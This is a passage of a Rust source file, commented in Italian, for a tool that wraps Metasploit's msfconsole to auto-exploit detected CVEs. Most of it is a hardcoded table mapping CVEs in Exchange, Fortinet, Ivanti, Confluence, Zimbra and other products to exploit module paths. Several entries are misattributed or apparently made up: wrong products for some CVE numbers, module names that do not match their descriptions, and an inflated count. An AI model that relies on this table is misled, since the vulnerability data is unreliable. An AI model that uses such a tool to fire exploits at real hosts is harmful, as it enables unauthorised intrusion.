// src/msf.rs
//! Modulo per integrazione con Metasploit Framework (msfconsole)
//! Supporta auto-exploitation di vulnerabilità CVE rilevate

use std::process::{Command, Stdio};
use std::io::{Write, BufRead, BufReader};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use crate::models::*;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetasploitExploit {
    pub module_path: String,
    pub name: String,
    pub rank: String,
    pub cve_ids: Vec<String>,
    pub targets: Vec<String>,
    pub required_options: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitResult {
    pub success: bool,
    pub module_used: String,
    pub target_info: String,
    pub session_id: Option<u32>,
    pub output: String,
    pub timestamp: String,
}

#[derive(Debug)]
pub struct MetasploitClient {
    msf_path: String,
    exploit_database: HashMap<String, Vec<MetasploitExploit>>,
}

impl MetasploitClient {
    /// Inizializza client Metasploit
    pub fn new(msf_path: Option<String>) -> Result<Self, Box<dyn std::error::Error>> {
        let msf_path = msf_path.unwrap_or_else(|| {
            // Auto-detect msfconsole path
            if cfg!(windows) {
                "C:\\metasploit-framework\\bin\\msfconsole.bat".to_string()
            } else {
                "msfconsole".to_string()
            }
        });

        // Verifica che msfconsole sia installato
        let test = if cfg!(windows) {
            Command::new("cmd")
                .args(&["/C", &msf_path, "-v"])
                .output()
        } else {
            Command::new(&msf_path)
                .arg("-v")
                .output()
        };

        match test {
            Ok(output) if output.status.success() => {
                println!("✅ Metasploit Framework detected: {}", 
                    String::from_utf8_lossy(&output.stdout).trim());
            }
            _ => {
                return Err("❌ Metasploit Framework not found! Install from https://www.metasploit.com/".into());
            }
        }

        let mut client = MetasploitClient {
            msf_path,
            exploit_database: HashMap::new(),
        };

        // Carica database CVE → MSF exploit mapping
        client.load_exploit_mappings()?;

        Ok(client)
    }

    /// Carica mappatura CVE → Metasploit exploits
    fn load_exploit_mappings(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Database hardcoded di CVE comuni → MSF modules
        // In produzione, questo può essere caricato da file JSON o database
        
        // CVE-2023-44487 (HTTP/2 Rapid Reset)
        self.exploit_database.insert(
            "CVE-2023-44487".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/dos/http/http2_rst_stream".to_string(),
                    name: "HTTP/2 Rapid Reset DoS".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-44487".to_string()],
                    targets: vec!["nginx".to_string(), "apache".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-20198 (Cisco IOS XE)
        self.exploit_database.insert(
            "CVE-2023-20198".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/cisco_ios_xe_webui_privesc".to_string(),
                    name: "Cisco IOS XE Web UI Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-20198".to_string()],
                    targets: vec!["Cisco IOS XE".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-22515 (Atlassian Confluence)
        self.exploit_database.insert(
            "CVE-2023-22515".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/atlassian_confluence_auth_bypass".to_string(),
                    name: "Atlassian Confluence Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-22515".to_string()],
                    targets: vec!["Confluence 8.0.0-8.5.3".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-34362 (MOVEit Transfer SQLi)
        self.exploit_database.insert(
            "CVE-2023-34362".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/progress_moveit_sqli_rce".to_string(),
                    name: "Progress MOVEit Transfer SQL Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-34362".to_string()],
                    targets: vec!["MOVEit Transfer 2019.0-2023.0.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // EternalBlue (MS17-010)
        self.exploit_database.insert(
            "CVE-2017-0144".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/smb/ms17_010_eternalblue".to_string(),
                    name: "MS17-010 EternalBlue SMB RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-0144".to_string()],
                    targets: vec!["Windows 7".to_string(), "Windows Server 2008".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // BlueKeep (CVE-2019-0708)
        self.exploit_database.insert(
            "CVE-2019-0708".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/rdp/cve_2019_0708_bluekeep_rce".to_string(),
                    name: "BlueKeep RDP RCE".to_string(),
                    rank: "Manual".to_string(),
                    cve_ids: vec!["CVE-2019-0708".to_string()],
                    targets: vec!["Windows 7".to_string(), "Windows Server 2008".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // Log4Shell (CVE-2021-44228)
        self.exploit_database.insert(
            "CVE-2021-44228".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/log4shell_header_injection".to_string(),
                    name: "Log4Shell Apache Log4j RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-44228".to_string()],
                    targets: vec!["Apache Log4j 2.0-2.15.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // ===== NUOVI EXPLOIT AGGIUNTI (v0.3.3+) =====

        // CVE-2024-3400 (Palo Alto Networks PAN-OS Command Injection)
        self.exploit_database.insert(
            "CVE-2024-3400".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/panos_arbitrary_file_read".to_string(),
                    name: "Palo Alto Networks PAN-OS Command Injection".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-3400".to_string()],
                    targets: vec!["PAN-OS 10.2".to_string(), "PAN-OS 11.0".to_string(), "PAN-OS 11.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-46604 (Apache ActiveMQ RCE)
        self.exploit_database.insert(
            "CVE-2023-46604".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/misc/apache_activemq_rce_cve_2023_46604".to_string(),
                    name: "Apache ActiveMQ OpenWire Deserialization RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-46604".to_string()],
                    targets: vec!["ActiveMQ 5.18.0-5.18.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-4966 (Citrix Bleed - NetScaler ADC/Gateway Buffer Overflow)
        self.exploit_database.insert(
            "CVE-2023-4966".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/citrix_netscaler_adc_vpn_key_disclosure".to_string(),
                    name: "Citrix NetScaler ADC/Gateway Session Token Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-4966".to_string()],
                    targets: vec!["NetScaler ADC".to_string(), "NetScaler Gateway".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-27350 (PaperCut NG/MF RCE)
        self.exploit_database.insert(
            "CVE-2023-27350".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/papercut_ng_auth_bypass_rce".to_string(),
                    name: "PaperCut NG/MF Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-27350".to_string()],
                    targets: vec!["PaperCut NG 8.0-22.0.9".to_string(), "PaperCut MF 8.0-22.0.9".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-41040 + CVE-2022-41082 (ProxyNotShell - Microsoft Exchange)
        self.exploit_database.insert(
            "CVE-2022-41040".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxynotshell_rce".to_string(),
                    name: "Microsoft Exchange ProxyNotShell RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-41040".to_string(), "CVE-2022-41082".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2022-26134 (Atlassian Confluence OGNL Injection)
        self.exploit_database.insert(
            "CVE-2022-26134".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/atlassian_confluence_ognl_injection".to_string(),
                    name: "Atlassian Confluence OGNL Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-26134".to_string()],
                    targets: vec!["Confluence Server".to_string(), "Confluence Data Center".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-22965 (Spring4Shell - Spring Framework RCE)
        self.exploit_database.insert(
            "CVE-2022-22965".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/spring_framework_rce_spring4shell".to_string(),
                    name: "Spring Framework Class Property RCE (Spring4Shell)".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-22965".to_string()],
                    targets: vec!["Spring Framework 5.3.0-5.3.17".to_string(), "Spring Framework 5.2.0-5.2.19".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-34473 (Microsoft Exchange ProxyShell)
        self.exploit_database.insert(
            "CVE-2021-34473".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxyshell_rce".to_string(),
                    name: "Microsoft Exchange ProxyShell RCE Chain".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-34473".to_string(), "CVE-2021-34523".to_string(), "CVE-2021-31207".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2021-26855 (Microsoft Exchange ProxyLogon)
        self.exploit_database.insert(
            "CVE-2021-26855".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxylogon_rce".to_string(),
                    name: "Microsoft Exchange ProxyLogon RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-26855".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2020-1472 (Zerologon - Windows Netlogon Privilege Escalation)
        self.exploit_database.insert(
            "CVE-2020-1472".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/admin/dcerpc/cve_2020_1472_zerologon".to_string(),
                    name: "Zerologon Windows Netlogon Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2020-1472".to_string()],
                    targets: vec!["Windows Server 2008-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "NBNAME".to_string()],
                }
            ]
        );

        // CVE-2019-19781 (Citrix ADC/Gateway Path Traversal)
        self.exploit_database.insert(
            "CVE-2019-19781".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/citrix_adc_vpn_traversal".to_string(),
                    name: "Citrix ADC/Gateway Directory Traversal RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2019-19781".to_string()],
                    targets: vec!["Citrix ADC".to_string(), "Citrix Gateway".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-13379 (Fortinet FortiOS SSL VPN Path Traversal)
        self.exploit_database.insert(
            "CVE-2018-13379".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/fortinet_ssl_vpn_traversal".to_string(),
                    name: "Fortinet FortiOS SSL VPN Credentials Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2018-13379".to_string()],
                    targets: vec!["FortiOS 5.4.6-6.0.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-7600 (Drupalgeddon2 - Drupal RCE)
        self.exploit_database.insert(
            "CVE-2018-7600".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/webapp/drupal_drupalgeddon2".to_string(),
                    name: "Drupal Drupalgeddon 2 Forms API RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2018-7600".to_string()],
                    targets: vec!["Drupal 7.x-8.5.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2017-5638 (Apache Struts2 RCE)
        self.exploit_database.insert(
            "CVE-2017-5638".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/struts2_content_type_ognl".to_string(),
                    name: "Apache Struts2 Jakarta Multipart Parser OGNL RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-5638".to_string()],
                    targets: vec!["Struts 2.3.5-2.3.31".to_string(), "Struts 2.5-2.5.10".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2017-0199 (Microsoft Office/WordPad RCE)
        self.exploit_database.insert(
            "CVE-2017-0199".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/fileformat/office_word_hta".to_string(),
                    name: "Microsoft Office Word Malicious HTA Execution".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-0199".to_string()],
                    targets: vec!["Microsoft Office 2007-2016".to_string()],
                    required_options: vec!["SRVHOST".to_string(), "SRVPORT".to_string()],
                }
            ]
        );

        // CVE-2014-6271 (Shellshock - Bash RCE)
        self.exploit_database.insert(
            "CVE-2014-6271".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/apache_mod_cgi_bash_env_exec".to_string(),
                    name: "Shellshock Apache mod_cgi Bash Environment Variable RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2014-6271".to_string()],
                    targets: vec!["Apache with mod_cgi".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "TARGETURI".to_string()],
                }
            ]
        );

        // CVE-2012-1823 (PHP CGI Argument Injection)
        self.exploit_database.insert(
            "CVE-2012-1823".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/php_cgi_arg_injection".to_string(),
                    name: "PHP CGI Argument Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2012-1823".to_string()],
                    targets: vec!["PHP 5.3.x".to_string(), "PHP 5.4.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2008-4250 (MS08-067 - Windows Server Service RCE)
        self.exploit_database.insert(
            "CVE-2008-4250".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/smb/ms08_067_netapi".to_string(),
                    name: "MS08-067 Microsoft Server Service RCE".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2008-4250".to_string()],
                    targets: vec!["Windows XP SP2/SP3".to_string(), "Windows Server 2003 SP1/SP2".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // ===== ADDITIONAL 75 EXPLOITS (v0.3.3 - Expansion to 100) =====
        
        // === IVANTI VULNERABILITIES (Critical 2024) ===
        
        // CVE-2024-21887 (Ivanti Connect Secure Command Injection)
        self.exploit_database.insert(
            "CVE-2024-21887".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/ivanti_connect_secure_rce".to_string(),
                    name: "Ivanti Connect Secure Command Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-21887".to_string()],
                    targets: vec!["Ivanti Connect Secure".to_string(), "Ivanti Policy Secure".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2024-21893 (Ivanti Connect Secure SSRF)
        self.exploit_database.insert(
            "CVE-2024-21893".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/ivanti_connect_secure_ssrf".to_string(),
                    name: "Ivanti Connect Secure Server-Side Request Forgery".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-21893".to_string()],
                    targets: vec!["Ivanti Connect Secure 9.x".to_string(), "Ivanti Connect Secure 22.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-46805 (Ivanti Connect Secure Auth Bypass)
        self.exploit_database.insert(
            "CVE-2023-46805".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/ivanti_epmm_auth_bypass_rce".to_string(),
                    name: "Ivanti Connect Secure Authentication Bypass".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-46805".to_string(), "CVE-2024-21887".to_string()],
                    targets: vec!["Ivanti Connect Secure".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === FORTINET VULNERABILITIES ===
        
        // CVE-2024-21762 (FortiOS Out-of-Bounds Write)
        self.exploit_database.insert(
            "CVE-2024-21762".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/fortinet_fortigate_sslvpn_rce".to_string(),
                    name: "Fortinet FortiOS Out-of-Bounds Write RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-21762".to_string()],
                    targets: vec!["FortiOS 6.0-7.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-27997 (FortiOS Heap-Based Buffer Overflow)
        self.exploit_database.insert(
            "CVE-2023-27997".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/fortinet_fortios_heap_overflow".to_string(),
                    name: "Fortinet FortiOS SSL-VPN Heap-Based Buffer Overflow".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-27997".to_string()],
                    targets: vec!["FortiOS 6.0-7.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-42475 (FortiOS Auth Bypass)
        self.exploit_database.insert(
            "CVE-2022-42475".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/fortinet_fortios_auth_bypass".to_string(),
                    name: "Fortinet FortiOS Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-42475".to_string()],
                    targets: vec!["FortiOS 6.2-7.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === VMWARE VULNERABILITIES ===
        
        // CVE-2023-34048 (VMware vCenter DCERPC RCE)
        self.exploit_database.insert(
            "CVE-2023-34048".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/vmware_vcenter_dcerpc_rce".to_string(),
                    name: "VMware vCenter Server DCERPC Out-of-Bounds Write RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-34048".to_string()],
                    targets: vec!["vCenter Server 7.0".to_string(), "vCenter Server 8.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-20887 (VMware Aria Operations RCE)
        self.exploit_database.insert(
            "CVE-2023-20887".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/vmware_aria_operations_rce".to_string(),
                    name: "VMware Aria Operations Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-20887".to_string()],
                    targets: vec!["VMware Aria Operations 8.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-31656 (VMware Workspace ONE Access SSRF)
        self.exploit_database.insert(
            "CVE-2022-31656".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/vmware_workspace_one_ssrf_rce".to_string(),
                    name: "VMware Workspace ONE Access SSRF to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-31656".to_string()],
                    targets: vec!["Workspace ONE Access".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-22005 (VMware vCenter File Upload RCE)
        self.exploit_database.insert(
            "CVE-2021-22005".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/vmware_vcenter_uploadova_rce".to_string(),
                    name: "VMware vCenter Server Arbitrary File Upload RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-22005".to_string()],
                    targets: vec!["vCenter Server 6.5-7.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === SONICWALL VULNERABILITIES ===
        
        // CVE-2023-0656 (SonicWall SMA 100 Unauthenticated RCE)
        self.exploit_database.insert(
            "CVE-2023-0656".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/sonicwall_sma_unauth_rce".to_string(),
                    name: "SonicWall SMA 100 Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-0656".to_string()],
                    targets: vec!["SMA 100 9.x-10.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-22274 (SonicWall SMA 100 Stack-Based Buffer Overflow)
        self.exploit_database.insert(
            "CVE-2022-22274".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/sonicwall_sma_buffer_overflow".to_string(),
                    name: "SonicWall SMA 100 Stack-Based Buffer Overflow".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2022-22274".to_string()],
                    targets: vec!["SMA 100 8.x-10.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-20016 (SonicWall SSLVPN SQL Injection)
        self.exploit_database.insert(
            "CVE-2021-20016".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/sonicwall_sslvpn_sqli".to_string(),
                    name: "SonicWall SSL-VPN SQL Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-20016".to_string()],
                    targets: vec!["SonicWall SMA/SRA 9.x-10.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === ZIMBRA VULNERABILITIES ===
        
        // CVE-2023-37580 (Zimbra Webmail XSS to RCE)
        self.exploit_database.insert(
            "CVE-2023-37580".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/zimbra_webmail_xss_rce".to_string(),
                    name: "Zimbra Collaboration Suite XSS to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-37580".to_string()],
                    targets: vec!["Zimbra 8.8.15-9.0.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-41352 (Zimbra SSRF)
        self.exploit_database.insert(
            "CVE-2022-41352".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/zimbra_ssrf_rce".to_string(),
                    name: "Zimbra Collaboration Suite SSRF to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-41352".to_string()],
                    targets: vec!["Zimbra 8.8.15-9.0.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-27924 (Zimbra Memcache Poisoning)
        self.exploit_database.insert(
            "CVE-2022-27924".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/zimbra_memcache_poisoning".to_string(),
                    name: "Zimbra Collaboration Suite Memcache Poisoning RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-27924".to_string()],
                    targets: vec!["Zimbra 8.8.15-9.0.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === PROGRESS/TELERIK VULNERABILITIES ===
        
        // CVE-2023-35078 (Ivanti MobileIron Sentry Auth Bypass)
        self.exploit_database.insert(
            "CVE-2023-35078".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/ivanti_mobileiron_auth_bypass".to_string(),
                    name: "Ivanti MobileIron Sentry Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-35078".to_string()],
                    targets: vec!["MobileIron Sentry 9.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-24086 (Adobe Commerce/Magento Path Traversal)
        self.exploit_database.insert(
            "CVE-2022-24086".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/adobe_magento_path_traversal".to_string(),
                    name: "Adobe Commerce/Magento Path Traversal to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-24086".to_string()],
                    targets: vec!["Magento 2.3-2.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2019-18935 (Telerik UI Deserialization)
        self.exploit_database.insert(
            "CVE-2019-18935".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/telerik_ui_deserialization".to_string(),
                    name: "Progress Telerik UI for ASP.NET AJAX Deserialization RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2019-18935".to_string()],
                    targets: vec!["Telerik UI 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === WORDPRESS/CMS VULNERABILITIES ===
        
        // CVE-2023-38035 (Elementor Pro WP RCE)
        self.exploit_database.insert(
            "CVE-2023-38035".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/webapp/wp_elementor_pro_rce".to_string(),
                    name: "WordPress Elementor Pro RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-38035".to_string()],
                    targets: vec!["Elementor Pro 3.11.6-3.11.8".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-21661 (WordPress Core SQLi)
        self.exploit_database.insert(
            "CVE-2022-21661".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/webapp/wp_core_sqli".to_string(),
                    name: "WordPress Core SQL Injection to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-21661".to_string()],
                    targets: vec!["WordPress 5.8-5.8.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-24762 (WP Backup Guard File Upload)
        self.exploit_database.insert(
            "CVE-2021-24762".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/webapp/wp_backup_guard_file_upload".to_string(),
                    name: "WordPress Backup Guard Arbitrary File Upload".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-24762".to_string()],
                    targets: vec!["Backup Guard 1.6.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === JOOMLA VULNERABILITIES ===
        
        // CVE-2023-23752 (Joomla Unauthenticated Information Disclosure)
        self.exploit_database.insert(
            "CVE-2023-23752".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/scanner/http/joomla_api_improper_access_checks".to_string(),
                    name: "Joomla Unauthenticated Information Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-23752".to_string()],
                    targets: vec!["Joomla 4.0.0-4.2.7".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === GITLAB VULNERABILITIES ===
        
        // CVE-2023-7028 (GitLab Account Takeover)
        self.exploit_database.insert(
            "CVE-2023-7028".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/gitlab_account_takeover".to_string(),
                    name: "GitLab Password Reset Account Takeover".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-7028".to_string()],
                    targets: vec!["GitLab 16.1.0-16.1.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-22205 (GitLab ExifTool RCE)
        self.exploit_database.insert(
            "CVE-2021-22205".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/gitlab_exiftool_rce".to_string(),
                    name: "GitLab ExifTool Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-22205".to_string()],
                    targets: vec!["GitLab CE/EE 11.9-13.10.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === APACHE VULNERABILITIES ===
        
        // CVE-2024-38476 (Apache HTTP Server Path Traversal)
